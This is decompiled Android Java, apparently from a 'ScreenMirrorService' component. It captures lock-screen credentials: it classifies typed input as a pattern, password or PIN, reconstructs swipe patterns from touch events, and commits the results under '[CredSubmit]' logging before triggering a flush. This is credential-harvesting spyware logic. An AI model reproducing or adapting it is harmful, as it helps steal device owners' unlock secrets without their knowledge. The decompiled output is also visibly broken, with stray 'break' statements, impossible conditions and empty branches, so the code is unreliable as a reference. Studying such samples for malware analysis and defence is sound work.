// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package f2;

import android.os.Handler;
import android.os.SystemClock;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;
import lyr.stable.runtime.ScreenMirrorService;
import w1.aa;
import w1.cf;
import w1.dc;
import w1.m8;
import w1.n4;
import w1.o2;
import w1.o8;
import w1.q5;
import w1.rd;
import w1.x2;
import w1.y2;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final class a {

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public Object f1115a;

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public Object f1116b;

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public Object f1117c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public Object f1118d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public Object f1119e;

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public Object f1120f;

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public Serializable f1121g;

    public void a(String str, String str2) {
        a2.b bVar = (a2.b) this.f1120f;
        ScreenMirrorService screenMirrorService = ((dc) this.f1119e).f3821a;
        if (str.isEmpty() || str2.isEmpty()) {
            return;
        }
        if ("pt".equals(str) || str2.contains(":E")) {
            screenMirrorService.Z0.removeCallbacks(bVar);
            this.f1115a = "";
            this.f1116b = "";
            c(str, str2, "passive");
            return;
        }
        screenMirrorService.Z0.removeCallbacks(bVar);
        this.f1115a = str;
        this.f1116b = str2;
        this.f1117c = "passive";
        screenMirrorService.Z0.postDelayed(bVar, 1400L);
    }

    public void b() {
        dc dcVar = (dc) this.f1119e;
        dcVar.f3821a.Z0.removeCallbacks((a2.b) this.f1120f);
        if (((String) this.f1115a).isEmpty() || ((String) this.f1116b).isEmpty()) {
            return;
        }
        String str = (String) this.f1115a;
        String str2 = (String) this.f1116b;
        String str3 = (String) this.f1117c;
        this.f1115a = "";
        this.f1116b = "";
        c(str, str2, str3);
    }

    /* JADX WARN: Code duplicated, block: B:103:0x014e  */
    /* JADX WARN: Code duplicated, block: B:133:0x01b4  */
    public void c(String str, String str2, String str3) {
        int i3;
        boolean z2;
        String str4;
        String str5;
        int i4;
        int i5;
        int i6;
        int i7;
        int i8;
        String strSubstring = str2;
        int iIndexOf = strSubstring.indexOf(":E");
        int i9 = 0;
        if (iIndexOf >= 0) {
            strSubstring = strSubstring.substring(0, iIndexOf);
        }
        String strTrim = strSubstring.trim();
        if (strTrim.length() < 4) {
            return;
        }
        String str6 = str3 == null ? "passive" : str3;
        int i10 = 1;
        if ("pt".equals(str)) {
            List listA = m8.a(strTrim);
            if (listA == null || listA.size() < 4 || listA.size() > 9) {
                return;
            }
            boolean[] zArr = new boolean[10];
            Iterator it = listA.iterator();
            while (it.hasNext()) {
                int iIntValue = ((Integer) it.next()).intValue();
                if (iIntValue < 1 || iIntValue > 9 || zArr[iIntValue]) {
                    return;
                } else {
                    zArr[iIntValue] = true;
                }
            }
            str5 = "pattern";
            i3 = 1;
        } else {
            if ("pa".equals(str)) {
                String strTrim2 = strTrim.trim();
                if (!strTrim2.isEmpty() && strTrim2.length() >= 4) {
                    int i11 = 0;
                    while (true) {
                        if (i11 >= strTrim2.length()) {
                            i3 = 1;
                            i4 = 0;
                            break;
                        }
                        if (!n4.c0(strTrim2.charAt(i11))) {
                            int i12 = i9;
                            i4 = i12;
                            while (true) {
                                if (i12 >= strTrim2.length()) {
                                    i3 = i10;
                                    break;
                                }
                                char cCharAt = strTrim2.charAt(i12);
                                if (cCharAt < 'A' || cCharAt > 'Z') {
                                    i3 = i10;
                                    if (cCharAt < 'a' || cCharAt > 'z') {
                                        if (n4.c0(cCharAt) || ((cCharAt < 'A' || cCharAt > 'Z') && ((cCharAt < 'a' || cCharAt > 'z') && ((cCharAt < '0' || cCharAt > '9') && (cCharAt < '!' || cCharAt > '~' || cCharAt == ' '))))) {
                                            i4 = 0;
                                            break;
                                        }
                                    }
                                    i12++;
                                    i10 = i3;
                                } else {
                                    i3 = i10;
                                }
                                i4 = i3;
                                i12++;
                                i10 = i3;
                            }
                        } else {
                            i11++;
                            i9 = 0;
                        }
                    }
                } else {
                    i3 = 1;
                    i4 = 0;
                    break;
                }
                if (i4 != 0) {
                    String strTrim3 = strTrim.trim();
                    if (!strTrim3.isEmpty() && strTrim3.length() >= 4) {
                        char cCharAt2 = strTrim3.charAt(0);
                        int i13 = i3;
                        while (true) {
                            if (i13 < strTrim3.length()) {
                                if (strTrim3.charAt(i13) != cCharAt2) {
                                    int i14 = 0;
                                    while (true) {
                                        if (i14 < strTrim3.length()) {
                                            char cCharAt3 = strTrim3.charAt(i14);
                                            if (!n4.c0(cCharAt3) && (cCharAt3 < '!' || cCharAt3 > '/')) {
                                                i6 = i3;
                                                break;
                                            }
                                            i14++;
                                        }
                                    }
                                } else {
                                    i13++;
                                }
                            }
                            i6 = 0;
                            break;
                        }
                    }
                    i6 = 0;
                    break;
                    if (i6 != 0) {
                        i5 = i3;
                    } else {
                        i5 = 0;
                    }
                } else {
                    i5 = 0;
                }
                if (i5 == 0) {
                    return;
                } else {
                    str4 = "password";
                }
            } else {
                i3 = 1;
                if (!"pi".equals(str)) {
                    return;
                }
                if (strTrim.length() >= 4 && strTrim.length() <= 16) {
                    int i15 = 0;
                    while (true) {
                        if (i15 >= strTrim.length()) {
                            z2 = true;
                            break;
                        }
                        char cCharAt4 = strTrim.charAt(i15);
                        if (cCharAt4 < '0' || cCharAt4 > '9') {
                            z2 = false;
                            break;
                        }
                        i15++;
                    }
                } else {
                    z2 = false;
                    break;
                }
                if (!z2) {
                    return;
                } else {
                    str4 = "pin";
                }
            }
            str5 = str4;
        }
        String str7 = str5 + ":" + strTrim;
        String str8 = (String) this.f1121g;
        if (str8.isEmpty()) {
            i8 = 0;
        } else if (str7.equals(str8)) {
            i8 = i3;
        } else {
            int iIndexOf2 = str8.indexOf(58);
            int iIndexOf3 = str7.indexOf(58);
            if (iIndexOf2 < 0 || iIndexOf3 < 0) {
                i7 = 0;
            } else {
                i7 = 0;
                if (str8.substring(0, iIndexOf2).equals(str7.substring(0, iIndexOf3))) {
                    String strSubstring2 = str8.substring(iIndexOf2 + 1);
                    String strSubstring3 = str7.substring(iIndexOf3 + 1);
                    if (strSubstring3.equals(strSubstring2) || (strSubstring2.startsWith(strSubstring3) && strSubstring3.length() < strSubstring2.length())) {
                        i8 = i3;
                    }
                }
            }
            i8 = i7;
        }
        if (i8 != 0) {
            return;
        }
        this.f1121g = str7;
        aa aaVar = (aa) this.f1118d;
        long jCurrentTimeMillis = System.currentTimeMillis();
        ScreenMirrorService screenMirrorService = aaVar.f3491d;
        rd rdVar = ScreenMirrorService.n6;
        try {
            y2.y(screenMirrorService).w(jCurrentTimeMillis, strTrim, str5, str6);
        } catch (Throwable th) {
            a0.a.p(th, new StringBuilder("[CredSubmit] commit fail: "), "ScreenMirror");
        }
        rd rdVar2 = ScreenMirrorService.n6;
        try {
            q.t tVar = cf.K().f3738y;
            if (tVar != null) {
                x2 x2Var = (x2) tVar.f3084h;
                Handler handler = (Handler) tVar.f3079c;
                if (((AtomicBoolean) tVar.f3081e).get()) {
                    handler.removeCallbacks(x2Var);
                    handler.postDelayed(x2Var, 300L);
                }
            }
        } catch (Throwable th2) {
            a0.a.p(th2, new StringBuilder("[CredSubmit] flush trigger fail: "), "ScreenMirror");
        }
    }

    /* JADX WARN: Code duplicated, block: B:25:0x0040  */
    public void d(ArrayList arrayList, boolean z2, boolean z3, boolean z4) {
        int size;
        boolean z5;
        int i3;
        int i4;
        ArrayList arrayList2 = (ArrayList) this.f1121g;
        q5 q5Var = (q5) this.f1115a;
        if (!z4) {
            q5Var.getClass();
            if (!q5Var.f4899a || !q5Var.f4900b || !q5Var.f4902d) {
                if (!q5Var.f4902d || !z2) {
                    z3 = false;
                }
            }
            if (!z3 && arrayList.size() == 9) {
                size = arrayList.size();
                z5 = false;
                i3 = 0;
                while (i3 < size) {
                    Object obj = arrayList.get(i3);
                    i3++;
                    o8 o8Var = (o8) obj;
                    i4 = o8Var.f4739a;
                    if (i4 < 1 && i4 <= 9 && o8Var.f4740b) {
                        boolean[] zArr = (boolean[]) this.f1120f;
                        if (!zArr[i4]) {
                            zArr[i4] = true;
                            arrayList2.add(Integer.valueOf(i4));
                            z5 = true;
                        }
                    }
                }
                if (z5 || z4 || arrayList2.isEmpty() || arrayList2.size() < 3) {
                    return;
                }
                boolean[] zArr2 = new boolean[10];
                int size2 = arrayList2.size();
                int i5 = 0;
                while (i5 < size2) {
                    Object obj2 = arrayList2.get(i5);
                    i5++;
                    int iIntValue = ((Integer) obj2).intValue();
                    if (iIntValue < 1 || iIntValue > 9 || zArr2[iIntValue]) {
                        return;
                    } else {
                        zArr2[iIntValue] = true;
                    }
                }
                ((o2) this.f1117c).getClass();
                SystemClock.uptimeMillis();
                dc dcVar = (dc) this.f1116b;
                a2.b bVar = (a2.b) this.f1119e;
                dcVar.f3821a.Z0.removeCallbacks(bVar);
                dcVar.f3821a.Z0.postDelayed(bVar, 2000L);
                if (arrayList2.size() >= 4) {
                    aa aaVar = (aa) this.f1118d;
                    StringBuilder sb = new StringBuilder(arrayList2.size() * 2);
                    for (int i6 = 0; i6 < arrayList2.size(); i6++) {
                        if (i6 > 0) {
                            sb.append(',');
                        }
                        sb.append(arrayList2.get(i6));
                    }
                    String string = sb.toString();
                    ScreenMirrorService screenMirrorService = aaVar.f3491d;
                    rd rdVar = ScreenMirrorService.n6;
                    try {
                        screenMirrorService.Y0.a("pt", string);
                        return;
                    } catch (Throwable th) {
                        a0.a.p(th, new StringBuilder("[z2] submit fail: "), "ScreenMirror");
                        return;
                    }
                }
                return;
            }
            return;
        }
        q5Var.getClass();
        z3 = true;
        if (z3) {
            return;
        }
        size = arrayList.size();
        z5 = false;
        i3 = 0;
        while (i3 < size) {
            Object obj3 = arrayList.get(i3);
            i3++;
            o8 o8Var2 = (o8) obj3;
            i4 = o8Var2.f4739a;
            if (i4 < 1) {
            }
        }
        if (z5) {
        }
    }
}
